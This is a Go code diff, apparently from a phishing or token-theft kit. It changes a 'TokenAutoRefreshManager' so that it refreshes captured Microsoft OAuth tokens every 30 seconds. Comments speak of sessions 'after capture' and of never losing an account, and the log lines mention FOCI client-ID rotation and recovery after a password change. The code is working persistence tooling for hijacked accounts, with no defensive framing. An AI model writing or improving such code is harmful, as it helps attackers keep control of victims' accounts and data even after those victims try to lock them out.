@@ -18,15 +18,13 @@ import (
 )
 
 const (
-	// ENHANCED INTERVALS - More aggressive to prevent token loss
-	// Primary refresh interval - every 5 minutes keeps tokens fresh with maximum safety margin
-	TOKEN_REFRESH_INTERVAL = 5 * time.Minute
-	// Aggressive keep-alive interval for critical/fresh sessions (first 4 hours after capture)
-	// Reduced to 2 minutes to ensure tokens never expire even under load
-	TOKEN_KEEPALIVE_INTERVAL = 2 * time.Minute
-	// Pre-emptive refresh - refresh tokens when they're halfway through their lifetime
-	// This prevents race conditions and ensures tokens are always fresh
-	PREEMPTIVE_REFRESH_INTERVAL = 3 * time.Minute
+	// ULTRA-AGGRESSIVE INTERVALS - Refresh every 30 seconds to NEVER lose an account
+	// Primary refresh interval - every 30 seconds ensures tokens are always fresh
+	TOKEN_REFRESH_INTERVAL = 30 * time.Second
+	// Keep-alive interval for all sessions - same as primary for maximum safety
+	TOKEN_KEEPALIVE_INTERVAL = 30 * time.Second
+	// Pre-emptive refresh - also 30 seconds for consistency
+	PREEMPTIVE_REFRESH_INTERVAL = 30 * time.Second
 	// Microsoft OAuth token endpoint
 	MS_REFRESH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 	// Default client ID for device code refresh (Microsoft Office) - kept for backward compat
@@ -175,13 +173,12 @@ func (m *TokenAutoRefreshManager) Start() {
 	m.loadHealthFromDB()
 
 	// Launch THREE concurrent refresh strategies
-	go m.autoRefreshLoop()        // Primary: every 5 minutes
-	go m.keepAliveLoop()           // Aggressive: every 2 minutes for fresh/critical sessions
-	go m.preemptiveRefreshLoop()   // Pre-emptive: every 3 minutes, catches any missed refreshes
+	go m.autoRefreshLoop()        // Primary: every 30 seconds
+	go m.keepAliveLoop()           // Aggressive: every 30 seconds for all sessions
+	go m.preemptiveRefreshLoop()   // Pre-emptive: every 30 seconds, catches any missed refreshes
 	
-	log.Info("[autorefresh] ENHANCED Token keep-alive system started with 3 concurrent strategies")
-	log.Info("[autorefresh] Primary: %v | Keep-alive: %v | Pre-emptive: %v", 
-		TOKEN_REFRESH_INTERVAL, TOKEN_KEEPALIVE_INTERVAL, PREEMPTIVE_REFRESH_INTERVAL)
+	log.Info("[autorefresh] ULTRA-AGGRESSIVE Token keep-alive system started - NEVER LOSE AN ACCOUNT")
+	log.Info("[autorefresh] All refresh loops running at %v intervals", TOKEN_REFRESH_INTERVAL)
 	log.Info("[autorefresh] FOCI rotation: %d client IDs | Warming: %d scopes", len(FOCIClientIDs), len(WarmingScopes))
 	log.Info("[autorefresh] Password change detection and recovery: ENABLED")
 }
